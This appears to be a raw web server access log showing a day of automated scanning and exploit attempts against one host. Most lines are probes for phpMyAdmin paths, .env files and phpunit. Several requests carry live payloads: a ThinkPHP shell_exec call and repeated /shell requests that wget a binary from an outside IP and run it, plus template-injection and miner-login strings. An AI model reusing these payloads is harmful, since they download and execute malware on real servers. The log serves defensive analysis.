78.83.217.220 - - [22/Jan/2023:06:54:19 -0600] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:20 -0600] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:20 -0600] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:20 -0600] "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:20 -0600] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:20 -0600] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:20 -0600] "GET /administrator/web/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:20 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:21 -0600] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:21 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:21 -0600] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:21 -0600] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:21 -0600] "GET /program/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:21 -0600] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:22 -0600] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:22 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:22 -0600] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:22 -0600] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:22 -0600] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:22 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:23 -0600] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:23 -0600] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:23 -0600] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:23 -0600] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:23 -0600] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:23 -0600] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:24 -0600] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:24 -0600] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:24 -0600] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:24 -0600] "GET /admin/pma/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:24 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:24 -0600] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:25 -0600] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:25 -0600] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:25 -0600] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:25 -0600] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:25 -0600] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:25 -0600] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:25 -0600] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:26 -0600] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.83.217.220 - - [22/Jan/2023:06:54:26 -0600] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
143.110.222.166 - - [22/Jan/2023:07:11:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
116.255.216.174 - - [22/Jan/2023:07:19:04 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
116.255.216.174 - - [22/Jan/2023:07:19:04 -0600] "GET /manager/html HTTP/1.1" 301 244 "-" "-"
128.199.237.246 - - [22/Jan/2023:08:05:41 -0600] "GET /_profiler/phpinfo HTTP/1.1" 301 249 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
143.110.222.166 - - [22/Jan/2023:08:07:01 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [22/Jan/2023:08:25:31 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [22/Jan/2023:08:25:33 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.35.18.189 - - [22/Jan/2023:08:36:25 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [22/Jan/2023:09:10:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.82 - - [22/Jan/2023:09:53:44 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [22/Jan/2023:10:06:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.137.206.216 - - [22/Jan/2023:10:16:51 -0600] "GET /public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_array&vars%5B0%5D=shell_exec&vars%5B1%5D%5B%5D=curl%20wget%20http://185.223.93.118/assailant.x86;chmod%20777%20assailant.x86;./assailant.x86 HTTP/1.1" 301 462 "-" "python-requests/2.28.2"
90.151.171.108 - - [22/Jan/2023:10:17:19 -0600] "CONNECT ip.bablosoft.com:443 HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.108 - - [22/Jan/2023:10:17:29 -0600] "GET http://ip.bablosoft.com/?Z71823167623Q1 HTTP/1.1" 301 247 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
143.110.222.166 - - [22/Jan/2023:11:08:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [22/Jan/2023:11:25:43 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [22/Jan/2023:11:25:43 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.175.98.250 - - [22/Jan/2023:11:36:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
89.175.98.250 - - [22/Jan/2023:11:36:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
154.89.5.113 - - [22/Jan/2023:11:43:29 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
179.43.177.242 - - [22/Jan/2023:11:57:18 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [22/Jan/2023:12:05:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.35.18.192 - - [22/Jan/2023:12:12:07 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
128.1.248.42 - - [22/Jan/2023:12:27:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
179.43.177.242 - - [22/Jan/2023:12:41:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
87.236.176.70 - - [22/Jan/2023:12:49:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
51.254.199.11 - - [22/Jan/2023:12:56:16 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0"
143.110.222.166 - - [22/Jan/2023:13:01:50 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.117.180.2 - - [22/Jan/2023:13:05:09 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
176.65.245.161 - - [22/Jan/2023:13:13:50 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
162.142.125.221 - - [22/Jan/2023:13:26:29 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
162.142.125.221 - - [22/Jan/2023:13:26:29 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.221 - - [22/Jan/2023:13:26:29 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
173.212.253.127 - - [22/Jan/2023:13:43:00 -0600] "GET /wp-admin/style.php?sig=rename HTTP/1.1" 301 270 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1"
173.212.253.127 - - [22/Jan/2023:13:43:00 -0600] "GET /style.php?sig=rename HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
152.89.196.211 - - [22/Jan/2023:13:51:13 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
107.170.249.26 - - [22/Jan/2023:13:55:26 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
156.199.193.61 - - [22/Jan/2023:14:00:21 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws HTTP/1.1" 301 292 "-" "Hello, world"
143.110.222.166 - - [22/Jan/2023:14:02:29 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [22/Jan/2023:14:05:34 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
156.220.134.239 - - [22/Jan/2023:14:15:43 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws HTTP/1.1" 301 292 "-" "Hello, world"
152.89.196.211 - - [22/Jan/2023:14:15:43 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
181.81.246.8 - - [22/Jan/2023:14:18:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.254.196.223 - - [22/Jan/2023:14:25:02 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [22/Jan/2023:14:25:03 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [22/Jan/2023:14:25:30 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
18.218.52.178 - - [22/Jan/2023:14:26:48 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
18.218.52.178 - - [22/Jan/2023:14:26:48 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
18.218.52.178 - - [22/Jan/2023:14:26:51 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.28.2"
152.89.196.211 - - [22/Jan/2023:14:30:46 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.42.19.13 - - [22/Jan/2023:14:37:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
205.185.118.237 - - [22/Jan/2023:14:39:19 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
152.89.196.211 - - [22/Jan/2023:14:42:12 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [22/Jan/2023:15:04:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [22/Jan/2023:15:15:46 -0600] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [22/Jan/2023:15:32:03 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.100.87.136 - - [22/Jan/2023:15:32:28 -0600] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 301 268 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
185.100.87.136 - - [22/Jan/2023:15:32:37 -0600] "POST /index.htm HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
152.89.196.211 - - [22/Jan/2023:15:37:50 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
191.37.203.120 - - [22/Jan/2023:15:41:05 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 301 291 "-" "Hello, world"
18.218.52.178 - - [22/Jan/2023:15:46:19 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
18.218.52.178 - - [22/Jan/2023:15:46:19 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
18.218.52.178 - - [22/Jan/2023:15:46:42 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.28.2"
185.213.174.115 - - [22/Jan/2023:15:47:51 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
185.213.174.115 - - [22/Jan/2023:15:47:58 -0600] "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"cpuminer/2.5.1\"]}\n" 400 226 "-" "-"
185.213.174.115 - - [22/Jan/2023:15:48:02 -0600] "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"MinerName/1.0.0\", \"EthereumStratum/1.0.0\"]}\n" 400 226 "-" "-"
185.213.174.115 - - [22/Jan/2023:15:48:05 -0600] "{\"id\":1,\"method\":\"eth_submitLogin\",\"worker\":\"eth1.0\",\"params\":[\"0xf82e23710e5ce255a75689e5f55eb59280929333\",\"x\"],\"jsonrpc\":\"2.0\"}\n" 400 226 "-" "-"
185.213.174.115 - - [22/Jan/2023:15:48:06 -0600] "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"48mEMjJW1jaU2eaKT5AkxpVrcxwhU41hE14TNF9bv8UvZfPDrxkvpK1AyHHHqueQ1nZtZ59CZ4sY7iAspmxU4s4oDYUTdzF\",\"pass\":\"x\",\"agent\":\"XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019\",\"algo\":[\"cn/1\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/double\",\"cn/ccx\",\"cn-lite/1\",\"cn-heavy/0\",\"cn-heavy/tube\",\"cn-heavy/xhv\",\"cn-pico\",\"cn-pico/tlo\",\"cn/upx2\",\"rx/0\",\"rx/wow\",\"rx/arq\",\"rx/graft\",\"rx/sfx\",\"rx/keva\",\"argon2/chukwa\",\"argon2/chukwav2\",\"argon2/ninja\",\"astrobwt\"]}}\n" 400 226 "-" "-"
185.213.174.115 - - [22/Jan/2023:15:48:09 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.213.174.115 - - [22/Jan/2023:15:48:12 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.213.174.115 - - [22/Jan/2023:15:48:16 -0600] "\b" 400 226 "-" "-"
